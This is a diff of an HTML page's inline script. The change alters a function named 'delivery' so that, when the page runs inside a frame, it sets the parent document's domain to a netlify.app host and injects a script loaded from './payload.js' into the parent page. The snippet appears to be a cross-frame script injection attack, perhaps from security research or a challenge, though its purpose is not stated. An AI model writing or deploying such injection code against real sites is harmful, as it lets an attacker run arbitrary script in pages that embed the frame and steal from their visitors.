@@ -10,9 +10,10 @@
     <script>
 
         function delivery() {
-            var payload = document.createElement('script');
+            parent.document.domain = "master--dainty-dusk-3f3151.netlify.app";
+            var payload = parent.document.createElement('script');
             payload.src = './payload.js';
-            document.body.appendChild(payload);
+            parent.document.body.appendChild(payload);
         }
 
         this.top.location !== this.location && (delivery());
